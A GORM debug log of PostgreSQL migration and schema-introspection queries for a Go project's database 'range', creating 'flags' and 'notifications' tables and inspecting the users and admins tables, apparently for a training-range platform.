2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.697ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'flags' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[25.742ms] [34;1m[rows:0][0m CREATE TABLE "flags" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"value" text NOT NULL,"machine_student_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_flags_machine_student" FOREIGN KEY ("machine_student_id") REFERENCES "machine_students"("id"))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.837ms] [34;1m[rows:0][0m CREATE UNIQUE INDEX IF NOT EXISTS "idx_MachineStudent_flag" ON "flags" ("machine_student_id")

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[18.406ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_flags_deleted_at" ON "flags" ("deleted_at")

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.665ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[19.592ms] [34;1m[rows:0][0m CREATE TABLE "notifications" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"message" text NOT NULL,"type" text NOT NULL,"send_at" timestamptz NOT NULL,"read" boolean,PRIMARY KEY ("id"))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.286ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_notifications_deleted_at" ON "notifications" ("deleted_at")

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.804ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.381ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.169ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.732ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[23.523ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[26.347ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.119ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.236ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.298ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.375ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.120ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.161ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.090ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.091ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.142ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.062ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.161ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.050ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.153ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.083ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.544ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.371ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.784ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.477ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.698ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'admins'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.720ms] [34;1m[rows:-][0m SELECT * FROM "admins" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.366ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'admins' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.050ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'admins'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.555ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'admins'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.176ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.179ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.743ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.232ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.202ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.002ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND constraint_name = 'fk_admins_user'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.808ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'admins' AND indexname = 'idx_admins_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.683ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'admins' AND indexname = 'idx_admin_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.755ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.433ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.759ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'notifications'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.009ms] [34;1m[rows:-][0m SELECT * FROM "notifications" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.824ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'notifications' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.748ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'notifications'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.574ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'notifications'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.089ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.065ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.128ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.427ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.861ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'message') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.395ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'type') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.305ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'send_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.151ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'read') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.849ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'notifications' AND indexname = 'idx_notifications_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.588ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notification_admins' AND table_type = 'BASE TABLE'

